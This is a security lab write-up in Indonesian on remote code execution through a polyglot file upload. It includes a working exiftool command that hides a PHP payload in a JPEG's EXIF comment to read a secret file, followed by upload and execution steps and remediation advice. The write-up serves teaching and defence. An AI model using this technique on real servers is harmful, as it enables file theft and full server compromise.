# Lab: Remote Code Execution via Polyglot Web Shell Upload

## 1. Executive Summary
Terjadi kerentanan **Polyglot File Upload** pada fitur unggah foto profil. Aplikasi web telah menerapkan validasi gambar yang ketat dengan memeriksa ukuran dan struktur biner berkas (*image header & dimensions*). Namun, server tetap memproses dan mengeksekusi berkas ber-ekstensi `.php` yang memiliki header gambar valid. Penyerang dapat menyisipkan skrip PHP ke dalam *metadata EXIF* berkas JPG (*polyglot file*) untuk melewati validasi server dan memperoleh **Remote Code Execution (RCE)**.

---

## 2. Vulnerability Details
| Parameter | Detail |
| :--- | :--- |
| **Vulnerability Type** | Polyglot File Upload / RCE via Metadata Injection |
| **Severity** | Critical |
| **Vector / Tool** | EXIF Metadata Comment Injection (`exiftool`) |
| **Impact** | Arbitrary Code Execution & Full Server Compromise |

---

## 3. Proof of Concept (Steps to Reproduce)

1. **Reconnaissance & Validation Check:**
   * Login ke aplikasi web dan coba unggah berkas `exploit.php` standar.
   * Upload ditolak karena server memverifikasi integritas dan dimensi gambar asli.

2. **Pembuatan Polyglot Web Shell:**
   * Ambil berkas gambar valid (misal: `avatar.jpg`).
   * Gunakan `exiftool` untuk menyisipkan *payload* PHP ke dalam bidang komentar (*EXIF Comment*) dan simpan dengan ekstensi `.php`:
     ```bash
     exiftool -Comment='<?php echo "---START---" . file_get_contents("/home/carlos/secret") . "---END---"; ?>' avatar.jpg -o polyglot.php
     ```

3. **Eksploitasi & Execution:**
   * Unggah berkas `polyglot.php` melalui fitur foto profil.
   * Server menerima berkas karena header biner dan dimensi gambar terdeteksi valid.
   * Panggil/akses URL gambar avatar yang diunggah (`/files/avatars/polyglot.php`).

4. **Ekstraksi Token:**
   * Web server mengeksekusi *payload* PHP yang terselip di dalam metadata gambar.
   * Ambil token rahasia yang tercetak di antara penanda `---START---` dan `---END---` pada *HTTP response*.

---

## 4. Remediation & Recommendation
* **Strip Metadata & Re-encode Image:** Jangan pernah menyimpan berkas gambar mentah dari pengguna. Gunakan pustaka pemrosesan gambar (seperti *ImageMagick* atau *GD Library*) untuk merender/menulis ulang gambar dan menghapus (*strip*) seluruh metadata EXIF sebelum disimpan.
* **Strict Execution Controls:** Matikan mesin eksekusi skrip (misal: modul PHP) pada seluruh folder media/avatar upload agar berkas berkode skrip tidak diproses sebagai program executable.
* **Storage Isolation:** Simpan media yang diunggah pengguna pada server terpisah (*Object Storage* / S3 Bucket) yang terisolasi dari lingkungan eksekusi kode backend aplikasi.
